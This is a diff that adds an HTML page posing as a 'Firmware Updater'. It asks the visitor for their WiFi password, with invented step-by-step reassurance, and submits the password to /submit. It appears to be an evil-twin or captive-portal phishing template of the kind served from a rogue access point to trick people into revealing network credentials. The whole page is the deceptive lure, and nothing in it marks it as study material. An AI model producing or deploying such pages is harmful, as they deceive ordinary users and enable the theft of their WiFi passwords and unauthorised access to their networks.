@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Firmware Updater</title>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <script src="js/site.js"></script>
+  </head>
+  <body>
+    <div id="status"></div>
+
+	<div class="container">
+		<div class="row">
+			<div class="col-12">
+				<h1 class="header">Firmware Updater</h1>
+                <form action="/submit" style="padding-left: 20px; padding-right: 20px;" method="get">
+                    <input style="width: 100%;" type="text" name="password" id="password" placeholder="Password" minlength="8" required>
+                    <input style="width: 100%; margin-top: 20px;" type="submit" value="UPDATE">
+                </form>
+				<h2>Disclaimer</h2>
+				<p >
+                    To update <b>Firmware</b>, you will need to enter the WiFi Password. The firmware password is a security feature that helps to protect your device from unauthorized firmware updates. To enter the firmware password, follow this steps.
+                    <br>
+                    <ul>
+                        <li>Go to firmware updater</li>
+                        <li>Input password</li>
+                        <li>Wait for verify password</li>
+                        <li>Updating firmware</li>
+                        <li>DONE</li>
+                    </ul>
+                    If you do not know the firmware password, you can contact the WiFi manufacturer for assistance.
+                </p>
+			</div>
+		</div>
+	</div>
+  </body>
+</html>
